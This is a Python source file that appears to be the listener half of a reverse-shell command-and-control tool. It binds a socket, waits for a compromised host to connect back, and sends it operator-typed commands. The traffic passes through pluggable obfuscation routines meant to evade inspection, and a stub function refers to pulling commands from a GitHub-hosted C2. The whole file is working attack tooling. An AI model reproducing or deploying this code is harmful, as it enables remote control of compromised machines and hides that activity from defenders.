import argparse
from config import PARAM
from modules.sneaks import obfuscation
from select import select
import socket


class ShellHelper:

    def __init__(self, args: argparse.Namespace) -> None:
        self.__readBuffer, _, _ = select([], [], [], 0)
        self.__cSoc: socket.socket
        self.__addr: socket._RetAddress
        self.__isipV6 = True if args.ipv6 else False
        self.__sneak = args.obfuscation
        self.__bindAddress: str = socket.gethostbyname(socket.gethostname())
        if self.__isipV6:
            self.__serverSoc = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        else:
            self.__serverSoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__serverSoc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        if args.port == None:
            raise Exception("NoPortSpecified", "[EE]: Destination port expected closing the program")
        self.__port = args.port
        if args.key != None:
            PARAM["key"] = args.key
        if args.addr != None:
            self.__bindAddress = args.addr
        self.__serverSoc.bind((self.__bindAddress, self.__port))

    def startShell(self) -> None:
        self.__serverSoc.listen(1)
        print(
            "*** Server started and listening on {}:{} ***".format(
                self.__bindAddress, self.__port
            )
        )
        self.__cSoc, self.__addr = self.__serverSoc.accept()
        print(
            "*** Connection Initiated from {}:{} ***".format(self.__addr[0], self.__addr[1])
        )
        print(self.__recvStuff())
        while True:
            try:
                print(self.__recvStuff(), end="")
                prompt = input()
                self.__sendStuff(prompt)
                print(self.__recvStuff())
                if prompt == "exit" or prompt == "close":
                    self.stopShell()
                    break
            except ConnectionResetError:
                self.stopShell()
            except ConnectionAbortedError:
                self.stopShell()
            
    def stopShell(self) -> None:
        self.__cSoc.close()
        self.__serverSoc.close()

    def __getFromSoc(self) -> str:
        if self.__readBuffer:
            return self.__cSoc.recv(4096).decode()
        else:
            return ""

    def __sendStuff(self, contents: str) -> None:
        result = obfuscation.SNEAKS[self.__sneak](contents)
        self.__cSoc.send(result.encode())

    def __recvStuff(self) -> str:
        result = ""
        temp = self.__cSoc.recv(4096).decode()
        while temp != "":
            result += temp
            temp = self.__getFromSoc()
        result = obfuscation.DSNEAKS[self.__sneak](result)
        return result.strip("\n")


def pullFromGithubC2() -> None:
    pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="A Helper script for getting contents from C2",
        epilog="""
        Example Usage:
        """,
    )
    parser.add_argument("--repo", type=str, help="Repository to pull from")
    parser.add_argument(
        "-o",
        "--obfuscation",
        type=str,
        default="nothing",
        help="Obfuscation used. Defaults to None",
    )
    parser.add_argument("-p", "--port", type=int, help="Port to listen on")
    parser.add_argument(
        "-l", "--listen", action="store_true", help="Start as server and listen"
    )
    parser.add_argument(
        "-r", "--refresh", action="store_true", help="Pull contents and refresh data"
    )
    parser.add_argument(
        "-k", "--key", type=str, help="Key to use in case of encrytions"
    )
    parser.add_argument(
        "-4", "--ipv4", action="store_true", help="Forces listener to use IPv4. Default"
    )
    parser.add_argument(
        "-6", "--ipv6", action="store_true", help="Forces listener to use IPv6"
    )
    parser.add_argument("-a", "--addr", type=str, help="Address to bind the listener")
    args = parser.parse_args()
    if args.listen:
        try:
            shellInstance = ShellHelper(args)
            shellInstance.startShell()
        except KeyboardInterrupt:
            print("[**]: Encountered keyboard interrupt, closing program")
            shellInstance.stopShell()
        except Exception as e:
            print(e.args[1])
            exit(0)